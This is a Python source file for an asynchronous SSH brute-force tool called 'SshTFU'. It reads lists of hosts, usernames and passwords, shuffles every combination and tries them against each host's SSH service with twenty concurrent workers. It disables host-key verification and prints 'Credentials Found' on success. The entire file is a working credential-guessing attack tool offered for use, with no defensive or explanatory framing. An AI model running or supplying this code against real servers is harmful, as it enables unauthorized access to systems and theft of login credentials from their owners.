import itertools
import asyncssh
import logging
import asyncio
import random

from pathlib import Path

log = logging.basicConfig(format='sshtfu 🠖 %(message)s', level=logging.WARNING)


class SshTFU:

    def __init__(self, hf, uf, pf, workers):
        self._hf = self._return_list(hf)
        self._uf = self._return_list(uf)
        self._pf = self._return_list(pf)
        self._workers = int(workers)
        self._timeout_list = []
        self._ignore_list = []


    @staticmethod
    def _return_list(item):
        stub = []
        config = Path(item)
        if config.is_file():
            for x in open(item):
                stub.append(x.rstrip())
            return stub
        else:
            stub.append(str(item).rstrip())
            return stub

    @staticmethod
    async def time_sleep(t):
        await asyncio.sleep(t)

    async def producer(self, queue):
        while True:
            items = list(itertools.product(self._hf, self._uf, self._pf))
            random.shuffle(items)
            for h, u, p in items:
                queue.put_nowait((h, u, p))
            break

    async def consumer(self, queue):
        while True:
            h, u, p = await queue.get()
            if h in self._ignore_list:
                queue.task_done()
                continue
            print(f"Attempting attack on {h:16} - ( {u} : {p} )                                             \r", end='')
            try:
                port = int(h.split(":")[1])
            except IndexError:
                port = 22
            while True:
                try:
                    await asyncio.wait_for(
                        asyncssh.connect(h, username=u, password=p, port=port, known_hosts=None), timeout=5)
                    print(f" 🠖 Credentials Found: {h:16} - ({u}:{p})                                                  ")
                except asyncssh.PermissionDenied:
                    break
                except asyncio.TimeoutError:
                    if h in self._timeout_list:
                        if h not in self._ignore_list:
                            self._ignore_list.append(h)
                            break
                    elif h not in self._timeout_list:
                        self._timeout_list.append(h)
                except asyncssh.ProtocolError as e:
                    break
                except Exception as e:
                    continue
                break
            queue.task_done()

    async def main(self):
        workers = self._workers
        queue = asyncio.Queue()
        producers = [asyncio.create_task(self.producer(queue))]
        consumers = [asyncio.create_task(self.consumer(queue)) for _ in range(workers)]
        await asyncio.gather(*producers)
        await queue.join()
        for c in consumers:
            c.cancel()


if __name__ == "__main__":
    laugh = SshTFU("/tmp/hosts.txt", "/tmp/users.txt", "/tmp/passwords.txt", 20)
    asyncio.run(laugh.main())
    print("\n")
